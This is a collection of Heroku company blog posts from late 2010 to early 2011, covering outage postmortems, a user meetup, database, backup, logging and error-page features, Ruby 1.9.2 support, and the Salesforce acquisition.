{"website": "Heroku", "title": "Tuesday Postmortem", "author": ["Mark McGranaghan"], "link": "https://blog.heroku.com/tuesday_postmortem", "abstract": "Tuesday Postmortem Posted by Mark McGranaghan October 27, 2010 Listen to this article Tuesday was not a good day for Heroku and as a result it was not a good day for our customers. I want to take the time to explain what happened, how we addressed the problem, and what we’re doing in the future to keep it from happening again. Over the past few weeks we have seen unprecedented growth in the rate of new applications being added to the platform. This growth has exacerbated a problem with our internal messaging systems that we’ve known about and been working to address. Unfortunately, the projects that we have underway to address the problem were planned based on previous growth rates and are not yet complete. A slowdown in our internal messaging systems caused a previously unknown bug in our distributed routing mesh to be triggered. This bug caused the routing mesh to fail. After isolating the bug, we attempted to roll back to a previous version of the routing mesh code. While the rollback solved the initial problem, there as an unexpected incompatibility between the routing mesh and our caching service. This incompatibility forced us to move back to the newer routing mesh code, which required us to perform a “hot patch” of the production system to fix the initial bug. This patch was successful and all applications were returned to service. As a result of the problems we have seen over the past couple of weeks, culminating with yesterday’s outage, we have reprioritized our ongoing projects. Several engineers have been dedicated to making short-term changes to the platform with an eye toward incrementally improving the stability of our messaging systems as quickly as possible. The first of these projects was deployed to our production systems last night and is already making an impact.  One of our operations engineers, Ricardo Chimal, Jr.,  has been working for some time on improving the way we target messages between components of our platform. We completed internal testing of these changes yesterday and they were deployed to our production cloud last night at 19:00 PDT (02:00 UTC ). After these changes were deployed, we immediately saw a dramatic improvement in the CPU utilization of our messaging system. The graph above was generated by Cloudkick , one of the tools that we use to manage our infrastructure, which shows a roughly 5x improvement from this first batch of changes on one of our messaging servers.  Ricardo’s excellent work is already making a big impact and we expect this progress to continue as additional improvements are rolled out over the coming days. View our official reason for outage statement here: http://status.heroku.com/incident/93 We know that you rely on Heroku to run your businesses and that we let you down yesterday. We’re sorry for the trouble today’s problems caused you. We appreciate your faith in us; we’re not going to rest until we’ve lived up to it.", "date": "2010-10-27,"},
{"website": "Heroku", "title": "HUG Update", "author": ["Ben Scofield"], "link": "https://blog.heroku.com/hug-update", "abstract": "HUG Update Posted by Ben Scofield October 28, 2010 Listen to this article A few weeks ago, we announced our first-ever Heroku Users Group (known henceforth and forever more as a HUG , showing just how much we love our developers!) meetup. We’re now a week away, and we thought it’d be a good time to go into a little more detail about the plan. On November 3rd at 7pm, we’re opening the doors to anyone who uses Heroku – developers who deploy to us, businesses built on our platform, add-on providers who create and manage services for our users, and more. We’re eager to get everyone in the same room, and we’re looking forward to see the new ideas and developments that will come out of all of us talking at this (and at future) meetups. To kick things off at this first event, though, we’re going to provide the content for you. Adam ‘s going to kick things off with a quick peek at several features that are in development.  He’ll be talking about the things many of you have been asking for, and they’ll make deploying complex application much more pleasant. After that, we’ll have a panel of representatives from each of our internal teams – the people who make Heroku run – and they’ll be ready and able to answer any questions you have. Curious about the routing mesh? They wrote it! Wondering about the future of Postgres at Heroku? They know! You bring the questions, they’ll bring the answers. And after all of that, the fun doesn’t stop – it just moves over a few blocks. At 9pm, we’re cosponsoring a drinkup at Bloodhound with our friends from Basho , so be sure to plan to stay out! As you might be able to tell, we’re getting more and more excited as we close in on the 3rd, and we’re looking forward to seeing you there. Don’t forget to let us know that you’re coming , and we’ll see you next week! meetup", "date": "2010-10-28,"},
{"website": "Heroku", "title": "HUG Recap", "author": ["Ben Scofield"], "link": "https://blog.heroku.com/hug-recap", "abstract": "HUG Recap Posted by Ben Scofield November 04, 2010 Listen to this article Last night, we threw our first-ever Heroku Users Group meetup, and it was a hit! Fifty Heroku users, add-on developers, entrepreneurs, and more gathered at our new office to get to know the Heroku team and swap stories with each other. We heard about some of the remarkable applications people are building on the platform, and we’re very excited to publicize those more — at future HUGs, in our newsletter, and here on the blog. For this first meetup, though, we decided to open the curtains around Heroku’s inner workings a bit. Adam gave a great talk about five new features that should make life easier, particularly for people working on large-scale applications: Logging enhancements Release management Postgres add-on Custom error pages Process inspection While most of these are still in beta testing, you can use heroku ps right now to take a look at your processes. Rest assured that you’ll be hearing more about each of them shortly, though. After Adam’s talk, we brought up several members of the team to sit on a panel and answer questions from the audience (and from our earlier call to #askheroku questions on Twitter) We heard excellent questions, and dug into some of the inner workings of our routing mesh, plans for the future, and more. See below for some of the questions and answers. We wrapped up the night at Bloodhound, where our friends from Basho joined us to co-sponsor a drink-up, where we all got the chance to meet and speak with even more people doing great work. All in all, we’re very happy with how the HUG turned out, and we’re looking forward to putting on more events in the future. Stay tuned to Twitter and the blog for more news. Questions from #askheroku @masonhale: @heroku When is PostgreSQL 9 support coming? #askheroku #pgsql Soon! 9 is part of the Postgres add-on that Adam talked about, and is on track to be available within a month or so. @im_a_muppet: Will you provide git push over http/https? Working behind corporate firewalls it is not possible to use Heroku.   #askheroku Git over http/https is something that we’ve investigated, but we don’t have a firm date for making it available yet. @leinweber: @heroku when can i tell you to exclude groups in my gemfile, ie test gems #askheroku You’ve been able to do this for a while now! Take a look at the docs for more details. @zackchandler: I’m sure the Heroku rabbitmq routing mesh is very cool – wonder how it works exactly? #askheroku This one’s a little more in-depth, so we’ll work on getting a blog post about it up in the near future. meetup", "date": "2010-11-04,"},
{"website": "Heroku", "title": "Announcing Heroku PostgreSQL Database Add-on", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/heroku_postgresql", "abstract": "Announcing Heroku PostgreSQL Database Add-on Posted by Matthew Soldo November 10, 2010 Listen to this article Today Heroku is releasing an update to our dedicated database service. Heroku PostgreSQL provides an improved upgrade path for our users as their applications grow by offering new features, new plans, and instant provisioning. Product Improvements Direct database connectivity through psql (the Postgres command-line tool) or libpq (the Postgres client library). Direct connectivity makes it easier to introspect the database directly and run ad-hoc queries. It also enables complex, multi-application architectures with shared data stores. Instant provisioning and customer driven migrations . Previously, upgrading to our dedicated databases was a semi-manual procedure which required assistance from our support team and took several hours to schedule and complete. The process now takes only a few minutes and is completely user controlled. PostgreSQL 8.4.4 support (Postgres 9 is coming soon…). Stored procedures through the PL/pgSQL language. Improved backup, restore, import and export through our new pgbackups add-on . New Plans In addition to these great new features, we’ve introduced several new plans : Ika : $800/month, 50 connections, 7.5 GB of RAM , 4 compute units Baku : $3200/month, 128 connections, 34 GB of RAM , 13 compute units Mecha : $6400/month, 256 connections, 68 GB of RAM , 26 compute units We now provide a suggested number of connections for each database plan. These are the maximum number of dynos, workers, and other processes that we recommend connecting to your database simultaneously. The connection numbers are meant to serve as a guideline for architecting a performant application on the Heroku platform. Legacy Dedicated Database Support Customers of Heroku’s legacy dedicated database (anyone who provisioned a dedicated database before today) can take advantage of these new features by provisioning a new database and migrating their application data to it.", "date": "2010-11-10,"},
{"website": "Heroku", "title": "Announcing PG Backups", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/pgbackups", "abstract": "Announcing PG Backups Posted by Matthew Soldo November 15, 2010 Listen to this article Heroku is launching a new database backup solution. Heroku PG Backups is available immediately and is the officially supported and recommended method of backing up your PostgreSQL database on Heroku. PG Backups is a significant architectural improvement over Bundles and is designed to handle the large-scale, production databases that are being deployed to Heroku today. In addition to these backend improvements, PG Backups offers several new features: Backups are captured using pg_dump’s -Fc compressed format. This is the most reliable, fastest way of capturing backups from PostgreSQL. Data can be easily imported to your application – the pgbackups:restore command can restore from a URL containing a PostgreSQL export. Backups captured with PG Backups can be made available as a time-limited URL for download and transfer. The basic plan allows you to store two backups for free, and the plus plan allows you to store seven backups. You can install PG backups on your application and capture your first backup immediately: $ sudo gem install heroku $ heroku addons:add pgbackups:basic $ heroku pgbackups:capture", "date": "2010-11-15,"},
{"website": "Heroku", "title": "Release Management on Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/releases", "abstract": "Release Management on Heroku Posted by Adam Wiggins November 17, 2010 Listen to this article When a team of developers uses continuous deployment to deploy to their Heroku staging and production apps multiple times per day, having a record of what was deployed and when can be very valuable.  This is especially true when bad code gets deployed: being able to recover quickly from failure is a key part of any agile process. Today, Heroku is announcing our release management add-on .  When installed on an app, every code deploy is recorded in a ledger with information about who deployed, when, and what commit hash.  And it’s not just code: anything that changes the app environment, such as adding or removing add-ons or changing config vars, creates an entry in the release ledger.  It looks like this: $ heroku releases\nRel   Change                By                  When\n----  -------------------   ----------          ----------\nv17   Deploy 38a0f41        julie@example.com   7 minutes ago\nv16   Config add API_URL    steve@example.com   31 minutes ago\nv15   Maintenance off       joe@example.com     6 hours ago The audit trail for deploys is useful information, and you can use a releases:info command to zoom in and get exact details for each release.  But what’s even better is being able to roll back from bad deploys, like a giant undo button for your app. $ heroku rollback\nRolled back to v16 The rollback command restores the previous release (or any release that you specify).  Rollbacks are a very quick operation, because unlike pushing up new code, your slug doesn’t need to be recompiled.  This is particularly significant for large apps with many gem dependencies. Release management isn’t terribly important for small apps; but for large production apps with many developers, frequent pushes, and lots of code, it’s vital.  The basic release management add-on (two levels of release history, one level rollback) is free; the advanced add-on (unlimited history and rollbacks) will be premium priced. Read the docs , then give it a spin and let us know how it works for you. This is the second in a series of new features targeted at large production applications (the first being support for larger databases ).  More features in this vein are coming soon!", "date": "2010-11-17,"},
{"website": "Heroku", "title": "Bundles Deprecation", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/bundles-deprecation", "abstract": "Bundles Deprecation Posted by Matthew Soldo November 30, 2010 Listen to this article Recently we announced the release of PG Backups , our new database backup service. Since then, PG Backups has seen rapid adoption and has been successfully managing the backups of a large and growing number of our production customers. Today we are announcing the deprecation of Bundles. Although Bundles has served the Heroku community well, we have found that it doesn’t scale to adequately meet the needs of the larger, more complex applications running on Heroku today. We encourage all of our users to migrate their application backup strategy to PG Backups as soon as possible. Starting today (November 30, 2010) we will no longer allow the Bundles add-on to be added to applications. Applications that already have Bundles installed will continue to function normally. On February 1, 2011, Bundles will cease capturing new backups. By this time all active applications on Heroku should have switched to using PG Backups to backup their data. Backups made with Bundles will continue to be available until April 4, 2011. After that time users will no longer be able to download or restore from Bundles-based backups. Please download any backups that you wish to permanently archive prior to this date.", "date": "2010-11-30,"},
{"website": "Heroku", "title": "The Next Level", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/the_next_level", "abstract": "The Next Level Posted by James Lindenbaum December 08, 2010 Listen to this article What if enterprise apps were built the way you’d build an agile Ruby app?  What if they were a pleasure to work with, deploy, and manage?  What if big companies could adopt the philosophies of Heroku and the Ruby community?  What if your company actually preferred you use Heroku to build apps? That’s the next level for Heroku.  That’s where we want to go, so we’ve made a decision we’re excited to share: we have signed a definitive agreement to be acquired by salesforce.com. We expect the deal to close by January 31st. Why Salesforce.com? Salesforce.com is the original cloud company. They convinced the enterprise world to consume software as a service before Gmail, Basecamp, or Facebook existed. They created one of the world’s first platforms-as-a-service and helped popularize the term. They get it. Heroku always aspires to be trusted by more customers with their data and applications. Salesforce.com has achieved a level of trust and credibility unparalleled in the cloud. They are trusted today by the largest companies on the planet to store their most sensitive data. And their sales and support organizations are second to none. We have long been fans of salesforce.com due to the unusual philosophies they share with us: No software, no private cloud There is so much value provided to customers when they consume services rather than buying software and running it themselves. Salesforce.com is religious about not selling software for private cloud use, and so are we. Abstraction = Value Don’t make users, customers, or developers do anything they don’t have to. Let them focus 100% on their data and their applications. Most products are more hands on and less abstract than Heroku. Salesforce.com however, is even farther down the abstraction curve than we are. Multi-Tenancy Multi-tenancy enables continuous upgrades and improvements, maintainability, and scale. Multi-tenancy is an architectural decision key to how both Heroku and salesforce.com have achieved success. Salesforce.com Loves Heroku Salesforce.com loves our developers and the community and culture they have brought to our platform. They love our maniacal focus on the developer experience. They love that we are a 100% open platform, enabling openness and choice everywhere we possibly can. They love that we support the tools and languages and architectures of the next generation of web apps. Salesforce.com aspires deeply to these same goals and sees Heroku as leading the way. Together we can bring an open platform for modern apps to enterprise customers. To hear this in the words of salesforce.com, see founder Parker Harris’s blog post: What I Love About Heroku . Independence Salesforce.com loves who we are and wants to preserve our brand, product, our values, and our roadmap. Though we’re joining forces, Heroku will remain independent. This means the whole Heroku team, the founders, our technology and services, our free offerings for developers, our exciting roadmap, existing customer signup process, and most importantly our philosophies will remain intact and unchanged. Our focus on design and user experience will stay as sharp as ever; we will stay purple.  The Heroku you know will continue to grow. Our roadmap stays the same, but we can do more of it, faster. Joining forces with salesforce.com gives us an enormous amount of fuel to keep building the platform toward the vision we’ve always had. Ruby This deal is a victory and validation for all of our early adopters, our passionate users and customers, and for the Ruby community as a whole. The combination of salesforce.com’s trust and credibility with Heroku’s developer-focussed platform will be an incredible force pushing Ruby into the mainstream. Heroku has been designed from the beginning to support multiple languages, but Ruby will always be our first love. As we’ve talked about before , over the long run we want to constantly support more use cases and allow developers to choose the right tool for the job, like we did with our experimental Node.js support .  Joining forces with salesforce.com doesn’t change this; we will add other languages when and where we feel it advances those goals. Amazon and Ecosystem Our relationship with Amazon Web Services will remain unchanged. We are huge fans of Amazon’s EC2 and the fast growing ecosystem of cloud services within it, and have no plans to leave. We are likely to add additional infrastructure providers over time to support a variety of customer use cases, and as above, we will follow the same path and decision making process we always have. Great for Developers and Customers Heroku will always be focused on developers above all else. Salesforce.com deeply understands why that is valuable and is making an enormous bet that we will continue to make developers happy. Not only does Salesforce.com want us to continue on unchanged, but they hope through this merger some of Heroku’s philosophies will rub off on them. With salesforce.com’s trust and credibility, it will soon be a no-brainer to convince your company to use Heroku for your important projects. With salesforce.com’s huge reach, we will be able to grow the ecosystem faster. This means more add-on providers with more great cloud service options for developers. For customers, this means we will soon provide better sales processes for larger organizations, add more trust and security for data and applications, achieve more IT policy compliance, and provide more premium support options. Great for Add-on Providers The salesforce.com brand plus accelerated growth of the developer base, the types of applications on the platform, and the number and size of customers all bring huge opportunity for add-on providers. Our Commitment The founders and the whole team at Heroku are 100% committed to the long term vision we have shared since the beginning. This is Heroku going to the next level; a chance to further our vision, to take things to a larger scale, and to reach a wider audience than ever before with our product and our message about next-generation deployment. We couldn’t be more amped! The Heroku Team Official press release here . news", "date": "2010-12-08,"},
{"website": "Heroku", "title": "Heroku Gets Sweet Logging", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/logging", "abstract": "Heroku Gets Sweet Logging Posted by Adam Wiggins December 13, 2010 Listen to this article Access to application logs on Heroku has historically been one of the least usable functions of the platform.  The “heroku logs” command was nothing more than a broadcast fetch of the logfiles for every web and worker dyno in your app.  This worked ok for small apps, but the user experience became very poor once you got past five or ten dynos. I’m incredibly excited to announce that today we’re rolling out the public beta of our new logging add-on .  This is a whole new way of capturing and collating logs, based on a syslog routing layer we’ve dubbed Logplex .  Logplex routes syslog traffic the same way that our HTTP routing mesh routes HTTP traffic.  Not coincidentally, Logplex was built by Orion Henry and Jacob Vorreuter, the same geniuses behind the Heroku HTTP routing mesh . Using Logplex, we can route logs not only from all of your application processes (web, worker) into a single location.  Even better, infrastructure components in the platform that interact with your app can also write to the same place.  For example, here’s a snippet of logs from a single HTTP request to a Rails app: $ heroku logs\n2010-10-21T14:11:16-07:00 app[web.2]: Processing PostController#list (for 208.16.84.131 at 2010-10-21 14:11:16) [GET]\n2010-10-21T14:11:16-07:00 app[web.2]: Rendering template within layouts/application\n2010-10-21T14:11:16-07:00 app[web.2]: Rendering post/list\n2010-10-21T14:11:16-07:00 app[web.2]: Rendered includes/_header (0.1ms)\n2010-10-21T14:11:16-07:00 app[web.2]: Completed in 150ms (View: 27, DB: 121) | 200 OK [http://myapp.heroku.com/]\n2010-10-21T14:11:16-07:00 heroku[router]: GET myapp.heroku.com/ dyno=web.2 queue=0 wait=0ms service=251ms bytes=24523\n2010-10-21T14:11:16-07:00 heroku[nginx]: GET / HTTP/1.1 | 208.66.27.62 | 247 | http | 304 The logs show not only the Rails logs from the dyno which served the request (web.2), but also logs from the HTTP routing mesh and Nginx.  We also log events like web dynos idling and un-idling, process restarts, and more. The logging add-on also adds some seriously bad-ass client-side features.  You can filter down to an individual source or process (for example, just your app logs, or just the logs from worker.1).  And realtime tail (heroku logs —tail) is spectacular for any app that’s doing heavy background processing. The docs have all the details. Keep in mind that this is a beta feature, so there will be a few rough edges.  During the beta process we need to prove that Logplex can scale to handle the huge volume of logs being generated by all the apps running on Heroku.  We’re also working on more options for long-term archival and search of app logs.  Once these questions are answered we’ll be able to remove the beta label, at which time the logging:basic add-on will become the default for all new apps.", "date": "2010-12-13,"},
{"website": "Heroku", "title": "PostgreSQL 9 Public Beta", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/postgresql9-public-beta", "abstract": "PostgreSQL 9 Public Beta Posted by Matthew Soldo December 17, 2010 Listen to this article At Heroku, we believe PostgreSQL offers the best mix of powerful features, data integrity, speed, standards compliance, and open-source code of any SQL database on the planet.  That’s why we were so excited to see the new release of PostgreSQL, version 9.0.1. The release is described as “the most anticipated PostgreSQL version in five years” for good reason. The release adds over 200 new features and improvements . For more on PostgreSQL 9, see the coverage in Computerworld , Infoworld , and Linux.com as well as the discussion on Hacker News . Today we are making PostgreSQL 9 available to all Heroku users through our public beta program. It is offered as a dedicated database with specifications identical to our existing Ronin plan.  As a beta release, we do not recommend using this for production applications . This is an excellent opportunity to test the compatibility of your schema and application code with PostgreSQL 9, and to try out its new features. Please note that our implementation does not yet support streaming replication or hot-standbys. The beta will be available for free provided that you test its compatibility with your application and fill out  this brief questionnaire . If you do not fill out the form we will charge the standard Ronin rate of $200 / month. The beta plan will be available for one month, after which we will ask  users to migrate to non-beta plans. To provision PostgreSQL 9 on a new application and restore a PG Backups database backup, use the following commands: $ sudo gem install heroku     # To install the latest version of the Heroku gem\n$ heroku addons:add heroku-postgresql:pg9test --app <your test app name>\n$ heroku pg:promote --db HEROKU_POSTGRESQL_PG9TEST_URL --app <your test app name>\n$ heroku pgbackups:restore `heroku pgbackups:url --app <your production app name>` Give it a try and let us know what you think.", "date": "2010-12-17,"},
{"website": "Heroku", "title": "Win a MacBook Air with Heroku + IndexTank", "author": ["Ben Scofield"], "link": "https://blog.heroku.com/hacking-over-the-holidays", "abstract": "Win a MacBook Air with Heroku + IndexTank Posted by Ben Scofield December 20, 2010 Listen to this article We’re very excited about the growth of the add-on ecosystem following the launch of the provider program — with dozens of add-ons in various stages of release, our developers have access to a wide variety of functionality for their applications. One of the most recent additions to the generally-available add-on catalog is IndexTank , a real-time search-as-a-service with some great features. In order to celebrate their release, IndexTank is sponsoring a contest over the holiday season. From last week until January 6th, they’re inviting developers to build the best app they can using the IndexTank add-on. You can see the full details over on IndexTank’s blog , but the TL;DR of it is: build something awesome on Heroku with the IndexTank add-on (they’re offering their $300/month plan for free during the contest) and submit it for judging. If you don’t have a huge dataset to work with, they’ve also got some great suggestions — everything from the Twitter firehose and Wikipedia to open government data from Sunlight Labs . As for prizes, they’re giving away a Macbook Air, a USB mini-monitor, and a t-shirt with a working guitar on it(!). Sneak away from the family for a little while over the holidays and make something great — get started today! contest", "date": "2010-12-20,"},
{"website": "Heroku", "title": "A New Approach to Errors", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/a_new_approach_to_errors", "abstract": "A New Approach to Errors Posted by Adam Wiggins December 21, 2010 Listen to this article When your app is crashed, out of resources, or misbehaving in some other way, Heroku serves error pages to describe the problem.  We also have a single page for platform errors, once known as the ouchie guy (pictured right). While the approach of showing error information directly via the web has worked well enough, there was room for improvement on both developer visibility and professionalism of presentation to end users.  With that in mind, we’ve reworked our approach on error handling, making improvements that should make it much easier for you, the developer, to diagnose and correct errors in your app. This new approach can be broken down into four features: Consolidated error page Logging of error codes Custom Error Pages add-on Improved maintenance mode These items are now available in public beta, activated by installing the Custom Error Pages add-on.  Once the public beta period is over, items 1, 2, and 4 will become the default for all apps. Let’s take a tour of this new world of error handling. Consolidated Error Page An error being served in a high-traffic app is more likely to be served to an end user than to the application developer; so showing information like “backlog too deep” or “request timed out” is useless and potentially confusing to the viewer.  All error pages served over HTTP are now represented by a consolidated error page , and always serve with an HTTP status code of 503. Logging of Error Codes Because we’re no longer putting details of the error into the page served via HTTP , you’ll need to get at them some other way.  In this new model, error details are now part of your application’s log.  We’ve assigned a unique code to each type of error, and they’l be placed alongside the log line produced by the HTTP router.  Like this: 18:05:10 heroku[router]: Error H12 (Request timeout) -> GET myapp.heroku.com/errortest dyno=web.1 queue=0 wait=0ms service=30000ms bytes=0 In this example, the dyno spent too long servicing the request and was timed out by the router.  Each type of error gets its own error code, with all HTTP errors starting with the letter H. Here’s the complete list of error codes. In the future we’ll be adding codes for other kinds of errors that can occur (for example, errors during deployment). Note that you’ll need the new logging add-on in order to see error code logging. Custom Error Pages The standard error page is unbranded, but you might wish to use an error page styled to match the rest of your site. You can’t do this directly, because these error pages are generated from outside your app.  (When your app is broken or overloaded, it’s impossible for it to serve any page.) The Custom Error Pages add-on gives you the ability to specify a URL to your own error page, which can have any text and style you want.  Usage is simple: $ heroku addons:add custom_error_pages\n Adding custom_error_pages to myapp...done.\n $ heroku config:add ERROR_PAGE_URL=http://s3.amazonaws.com/your_bucket/your_error_page.html You can put your HTML anywhere, though we recommend S3 for its simplicity and reliability. Full docs for Custom Error Pages. Improved Maintenance Mode The final piece of the puzzle is a new maintenance mode, to address problems with our current maintenance mode implementation for apps with more than fifty dynos.  This new implementation handles maintenance mode at the HTTP router, providing an instantaneous response for turning maintenance mode on or off regardless of the size of your app.  It uses a standard page which serves with an HTTP 503 code.  You can use the Custom Error Pages add-on to provide your own maintenance page to the router.  (If for some reason you prefer the current maintenance mode, it’s available as Rack middleware .) Conclusion During the beta, adding the Custom Error Pages add-on will turn on the consolidated error page, logging of error codes, and the new maintenance mode.  When the beta is over, everything other than the add-on itself will become standard for all apps.  Custom Error Pages will become a premium-priced feature after the beta, reflecting its nature as useful primarily to production apps with significant investment in their brand image. We believe these changes will significantly improve the experience of dealing with errors on Heroku.  Give it a try and tell us if you agree!", "date": "2010-12-21,"},
{"website": "Heroku", "title": "Improved Maintenance Mode for All Apps", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/improved_maintenance_mode_for_all_apps", "abstract": "Improved Maintenance Mode for All Apps Posted by Adam Wiggins January 06, 2011 Listen to this article The improved maintenance mode we described last month is now standard for all existing and new apps. This new maintenance mode is faster and much more scalable, particularly for apps with more than fifty dynos.  It handles maintenance mode at the HTTP router, providing an instantaneous response for turning maintenance mode on or off regardless of the size of your app. It uses a standard page which serves with an HTTP 503 code.  You can use the Custom Error Pages add-on to provide your own maintenance page to the router. (If you preferred the old maintenance mode, you can manually add it to your app by installing this middleware and setting a MAINTENANCE config var.) Read the docs for usage instructions on the new maintenance mode.", "date": "2011-01-06,"},
{"website": "Heroku", "title": "New Logging Now in General Availability", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/new_logging_now_in_general_availability", "abstract": "New Logging Now in General Availability Posted by Adam Wiggins February 03, 2011 Listen to this article In December, we rolled out the public beta of a sweet new logging system for Heroku . The new system combines log output from your app’s processes and Heroku’s system components (such as the HTTP router). With all of your logs collated into a single, time-ordered stream, you get an integrated view of everything happening in your app. Here’s a sample: $ heroku logs\n2010-10-21T14:11:16-07:00 app[web.2]: Processing PostController#list (for 208.16.84.131 at 2010-10-21 14:11:16) [GET]\n2010-10-21T14:11:16-07:00 app[web.2]: Rendering template within layouts/application\n2010-10-21T14:11:16-07:00 app[web.2]: Rendering post/list\n2010-10-21T14:11:16-07:00 app[web.2]: Rendered includes/_header (0.1ms)\n2010-10-21T14:11:16-07:00 app[web.2]: Completed in 150ms (View: 27, DB: 121) | 200 OK [http://myapp.heroku.com/]\n2010-10-21T14:11:16-07:00 heroku[router]: GET myapp.heroku.com/ dyno=web.2 queue=0 wait=0ms service=251ms bytes=24523\n2010-10-21T14:11:16-07:00 heroku[nginx]: GET / HTTP/1.1 | 208.66.27.62 | 247 | http | 304 Logging comes in three plans : Basic provides access to logs from your app and the Heroku system. Expanded includes feature upgrades such as realtime tail and filtering . It’s free for verified users. Advanced supports high-traffic, production-grade apps with truly powerful features such as unlimited throughput and syslog drains . This plan is priced at $100. Today we’re taking the beta label off of all the Logging add-on plans and moving them to general availability.  All new apps will get basic logging by default, and existing apps can opt in to the new system by installing the logging:basic add-on.  Make sure you have the latest Heroku client gem (gem install heroku) to access the client-side features of the new logging system.", "date": "2011-02-03,"},
{"website": "Heroku", "title": "The Path Forward: Ruby 1.9.2", "author": ["Ben Scofield"], "link": "https://blog.heroku.com/the-path-forward-192", "abstract": "The Path Forward: Ruby 1.9.2 Posted by Ben Scofield February 09, 2011 Listen to this article At Heroku, we’ve been watching the progress of MRI very carefully for a while now; we added support for 1.9.1 nearly a year ago and 1.9.2 more recently, and we’ve seen thousands of apps created and running successfully on the 1.9 series of VMs. At the same time, we’ve seen the community as a whole recognize the importance of 1.9 by migrating libraries and gems to it and providing resources and tutorials on upgrading. Today, Heroku is putting our full support behind Ruby 1.9.2 as the future of MRI . It is a stable, battle-tested, production-quality Ruby, and we’re excited to see it become the mainstay for future Ruby development. What this means today We encourage all Heroku developers to use Ruby 1.9.2 for new apps. You can create an app on 1.9.2 with the following command: $ heroku create --stack bamboo-mri-1.9.2 We also encourage developers to port (or at least test) existing apps on 1.9.2, and to contribute bug reports, feedback, and patches to libraries that aren’t currently 1.9.2-compatible: $ heroku stack:migrate bamboo-mri-1.9.2 As part of this effort, we have also deprecated the bamboo-mri-1.9.1 stack. Apps that are currently running on it will not be affected, but no new 1.9.1 apps can be created, and you are no longer able to migrate to 1.9.1. What this means going forward As of now, bamboo-ree-1.8.7 is still the default stack for new Heroku apps. As support for Ruby 1.9.2 continues to improve, we will regularly review this, with the goal of making 1.9.2 the default in the future. We’ll provide plenty of notice before this switch, of course. Resources for Ruby 1.9.2 There are a number of great resources for learning about and trying out Ruby 1.9.2. Here are some of our favorites, but feel free to leave yours in the comments! Programming Ruby 1.9 – the latest edition of the book that brought Ruby to the English-speaking world. RVM – we recommend RVM for managing your Rubies in development; it makes testing apps against alternate implementations as painless as possible. Upgrading to Ruby 1.9 – David A Black’s summary of the top 10 things to watch out for when moving from 1.8 to 1.9 – and don’t miss the sequel , which contains even more good information. Is It Ruby 1.9? – a community-powered site for monitoring gem compatibility (and be sure to contribute to it!) ruby", "date": "2011-02-09,"},
{"website": "Heroku", "title": "Using Bundler Groups on Heroku", "author": ["David Baliles"], "link": "https://blog.heroku.com/using-bundler-groups-on-heroku", "abstract": "Using Bundler Groups on Heroku Posted by David Baliles February 15, 2011 Listen to this article Bundler groups are commonly used to specify which dependencies of your application are needed in a given environment. You may have something like this in your Gemfile: group :test do\n   gem \"rspec\"\n end Using the \"test\" group in this case allows you to specify the gems that are needed to test your application. Since you won’t need these gems in production, you can speed up installation by ignoring the \"test\" group. Bundler provides this ability through the --without option: bundle install --without test You can currently access this functionality on Heroku by setting the BUNDLE_WITHOUT config var in your application. Starting today we are going to default BUNDLE_WITHOUT to \"development:test\" on all new applications. If necessary, you can change this value for your application by changing the BUNDLE_WITHOUT config var: heroku config:add BUNDLE_WITHOUT=\"foo:bar\" Existing applications will not be affected by this change to the default. If you have an existing application and would like to take advantage of this feature, simply set the BUNDLE_WITHOUT config var to an appropriate value. We hope that this new default will help to reduce the deploy time of your Heroku applications. Please give it a try and let us know your thoughts! Update: You can find the most recent information about this topic in our Managing Gems with Bundler article on Dev Center .", "date": "2011-02-15,"},
{"website": "Heroku", "title": "Announcing Heroku for Logo... powered by Heroku", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/announcing_heroku_for_logo", "abstract": "Announcing Heroku for Logo... powered by Heroku Posted by James Lindenbaum April 01, 2011 Listen to this article Since launching Ruby support in 2007, we’ve been constantly expanding the platform to accommodate more application types and to make the platform more accessible to a broader audience of developers. We are very pleased today to announce full support for applications written in the Logo programming language. Going back to our roots with an in-browser editor, we believe that interactive programming and getting started quickly lend well to learning.  Ruby is an excellent language for learning (check out Hackety Hack ), and Logo is even better. Logo is a fully-featured and beautifully designed functional Lisp-style programming language.  It shares many properties with (and is an ancestor of, via Smalltalk) Ruby, including being an interpreted language with dynamic typing and excellent set manipulation – including filter, map, reduce, and other iterators similar to Ruby’s excellent Enumerable methods. Available Immediately Experimental Logo support is available immediately and can be used by simply pushing an application to Heroku that contains a file with the .lgo suffix. Check out our example apps cranes.heroku.com and logo-blank.heroku.com .  Then give it a try yourself: $ echo \"fd 100 rt 90 fd 100\" > cranes.lgo\n$ git init && git add . && git commit -m init\n$ heroku create cranes\nCreated http://cranes.heroku.com/ | git@heroku.com:cranes.git\n\n$ git push heroku master\n-----> Heroku receiving push\n-----> Logo app detected\n-----> Embedding Logo runtime... done\n       Compiled slug size is 20K\n-----> Launching... done\n       http://cranes.heroku.com deployed to Heroku More details available in the Dev Center . Submit Cool Apps for Prizes If you build an awesome Logo app this weekend, tweet it @heroku.  On Monday we’ll pick the 10 coolest Logo apps to showcase, and the winners will receive Heroku care packages with t-shirts, stickers, and platform credits. Attribution Heroku’s Logo support is based on the excellent Javascript-based Logo Interpreter by Joshua Bell . newfeatures", "date": "2011-04-01,"},
{"website": "Heroku", "title": "Post-mortem on April 21 Outage", "author": ["Oren Teich"], "link": "https://blog.heroku.com/post_mortem_on_april_21_outage", "abstract": "Post-mortem on April 21 Outage Posted by Oren Teich April 26, 2011 Listen to this article On April 21st 2011, Heroku experienced a widespread application outage.  We have posted a full post-mortem detailing the causes and steps we are taking to prevent similar outages from happening in the future. Heroku status always contains our current status.  You can follow @herokustatus to follow status updates via twitter.", "date": "2011-04-26,"},
